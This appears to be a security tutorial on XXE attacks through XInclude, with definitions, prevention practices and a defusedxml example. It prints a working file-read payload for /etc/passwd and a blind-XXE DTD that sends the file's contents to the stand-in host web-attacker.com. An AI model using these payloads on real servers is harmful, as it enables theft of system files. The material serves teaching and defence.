# XXE via XInclude

## XXE via XInclude

### **Summary**

XML External Entity (XXE) vulnerabilities occur when an application processes user-controlled XML data without proper validation. Attackers can exploit these vulnerabilities to read sensitive files from the server, perform **server-side request forgery (SSRF)**, and potentially execute **denial-of-service (DoS) attacks**. This is significant because XML parsers can handle **external entities**, leading to unauthorized data access or remote interactions.

***

### **Definition Bank**

* **XML (Extensible Markup Language):** A markup language used for encoding documents in a format readable by both humans and machines.
* **External Entity:** A reference in an XML document that points to an external source, such as a file or URL.
* **Blind XXE:** An attack where the response doesn't reveal data directly but can still be exfiltrated through out-of-band techniques.
* **SSRF (Server-Side Request Forgery):** An attack where the server makes unauthorized requests to internal resources on behalf of the attacker.
* **Namespace:** A collection of XML elements and attributes identified by a unique URI.

***

### **XInclude Attack Summary**

#### **What is XInclude?**

XInclude (**XML Inclusions**) allows external resources (such as files) to be included in an XML document using the `<xi:include>` tag.

#### **Key Components of an XInclude Attack**

**1. Namespace Declaration (Required)**

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
```

* This **activates** the XInclude feature in XML.
* The URL `"http://www.w3.org/2001/XInclude"` is **not a link** but a **label** that tells the XML parser to recognize XInclude functionality.

**2. File Inclusion Payload:**

```xml
<xi:include parse="text" href="file:///etc/passwd"/>
```

* **`href`** specifies the file to retrieve (`/etc/passwd`).
* **`parse="text"`** ensures the file content is returned as plain text.

**How the Attack Works:**

1. The namespace (`xmlns:xi`) **enables** the use of `<xi:include>`.
2. The payload with `href="file:///etc/passwd"` tries to load a local file.
3. If successful, the server returns the file content in the response.

#### **Key Insight:**

* The **namespace activates the feature**, while the **`href`** specifies the target file.
* Without the namespace, the XML parser will not recognize `<xi:include>`.

***

### **Exploiting Blind XXE to Exfiltrate Data Out-of-Band**

#### **Example of a Malicious DTD**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD performs the following steps:

* Defines an XML parameter entity called `file`, containing the contents of `/etc/passwd`.
* Defines an XML parameter entity called `eval`, which dynamically declares another entity called `exfiltrate`.
* The `exfiltrate` entity makes an HTTP request to an attacker's server, exfiltrating the data.

#### **Hosting the Malicious DTD**

The attacker must host this DTD on a system they control, such as:

```
http://web-attacker.com/malicious.dtd
```

#### **XXE Payload Example:**

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

This payload forces the XML parser to fetch the external DTD from the attacker's server and execute the malicious commands, exfiltrating `/etc/passwd`.

***

### **Comparison Table: Secure vs Insecure Practices**

| **Secure Practice**             | **Insecure Practice**                 |
| ------------------------------- | ------------------------------------- |
| Use **SAX** or **StAX** parsers | Use **DOM** parsers (more vulnerable) |
| Disable external entity loading | Allow external entity loading         |
| Use `secure processing` mode    | Default XML parser settings           |
| Validate and sanitize input     | Process untrusted XML directly        |

***

### **Best Practices for Preventing XXE Attacks**

* **Disable External Entity Processing:** Ensure the XML parser does not process external entities.
* **Use Safer Parsers:** Choose parsers like SAX and StAX over DOM.
* **Input Validation:** Properly validate and sanitize all XML inputs.
* **Implement Least Privilege:** Limit the server's file system access.
* **Use Security Libraries:** Consider libraries like `defusedxml` in Python.

#### **Example of Secure XML Parsing (Python)**

```python
import defusedxml.ElementTree as ET
ET.parse('data.xml')  # Secure parsing without external entities
```

***

### **Conclusion**

XXE vulnerabilities can lead to severe security issues such as **data breaches** and **server-side request forgery (SSRF)**. Following best practices like **disabling external entities**, **using secure parsers**, and **validating XML input** can help mitigate these attacks effectively.
